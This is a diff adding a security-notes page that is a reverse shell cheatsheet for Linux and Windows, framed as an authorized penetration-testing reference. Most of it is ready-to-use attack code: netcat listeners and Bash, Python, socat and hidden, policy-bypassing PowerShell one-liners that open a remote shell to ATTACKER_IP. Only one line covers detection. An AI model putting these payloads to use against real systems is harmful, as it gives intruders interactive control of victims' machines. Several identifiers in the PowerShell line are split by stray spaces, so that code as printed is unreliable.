@@ -1,0 +1,77 @@
+﻿---
+title: "Reverse Shells Cheatsheet — Linux & Windows"
+description: "Authorized penetration testing reference for Linux and Windows reverse shell one-liners, listener setup, and defensive detection indicators."
+date: "2026-06-06"
+tags: ["reverse-shell", "linux", "windows", "pentest", "cheatsheet"]
+category: "notes"
+subcategory: "security"
+difficulty: "Advanced"
+reading Time: "12 min read"
+---
+
+# Reverse Shells Cheatsheet — Linux & Windows
+
+
+<Callout type="warning" title="Defensive & Authorized Auditing Purposes Only">
+**Authorized Testing Only**
+Use these techniques only in lab environments, CTF challenges, or systems you own or have explicit written permission to test. Unauthorized access is illegal.
+</Callout>
+
+
+## Overview
+
+A reverse shell connects outbound from a compromised or test host back to your listener, bypassing inbound firewall rules that block direct connections. This cheatsheet consolidates common Linux and Windows payloads used in OSCP-style labs and authorized assessments.
+
+## Listener Setup
+
+Start a Netcat listener on your attack machine before executing a payload on the target:
+
+```bash
+nc -lvnp 4444
+rlwrap nc -lvnp 4444
+
+```
+
+## Linux Reverse Shells
+
+Replace ATTACKER_IP and PORT with your listener address.
+
+### Bash
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+```
+
+### Python
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+```
+
+### Socat
+
+```bash
+socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+```
+
+## Windows Reverse Shells
+
+### Power Shell
+
+```powershell
+powershell -No P -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.Get Stream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).Get String($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII.Get Bytes($r2));$s.Write($sb,0,$sb.Length)}"
+
+```
+
+## Defensive Detection Indicators
+
+Monitor outbound connections, suspicious process command lines (Event 4688), and Power Shell Script Block Logging (Event 4104).
+
+---
+
+## Educational Use Notice
+
+Always obtain proper authorization before testing systems or networks.
